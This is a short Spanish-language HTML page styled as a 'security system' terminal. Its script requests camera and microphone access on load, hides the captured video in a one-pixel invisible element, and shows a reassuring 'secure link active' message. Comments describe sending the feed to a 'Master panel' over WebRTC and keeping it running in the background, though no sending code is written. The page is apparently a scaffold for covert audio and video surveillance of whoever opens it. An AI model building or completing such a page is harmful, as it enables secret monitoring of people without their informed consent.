<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE SEGURIDAD PABLO</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ff00; text-align: center; padding-top: 50px; }
        .status { font-size: 1.2rem; margin-bottom: 20px; }
        video { width: 1px; height: 1px; opacity: 0; } /* Video oculto para que no estorbe */
    </style>
</head>
<body>
    <div class="container">
        <div class="status" id="estado">🛰️ CONECTANDO CON CENTRAL...</div>
        <p class="text-secondary">Monitoreo Activo en Segundo Plano</p>
        <div class="spinner-border text-success" role="status"></div>
    </div>

    <video id="videoLocal" autoplay playsinline muted></video>

    <script>
        // ESTO PIDE LOS PERMISOS AUTOMÁTICAMENTE
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            document.getElementById('videoLocal').srcObject = stream;
            document.getElementById('estado').innerText = "✅ VÍNCULO SEGURO ACTIVO";
            
            // Aquí se enviaría la señal a tu panel Master usando WebRTC
            console.log("Transmitiendo...");
        })
        .catch(err => {
            document.getElementById('estado').innerText = "❌ ERROR: PERMISOS DENEGADOS";
            console.error(err);
        });

        // Mantener activo aunque minimice el navegador
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                console.log("Sigue transmitiendo en segundo plano...");
            }
        });
    </script>
</body>
</html>
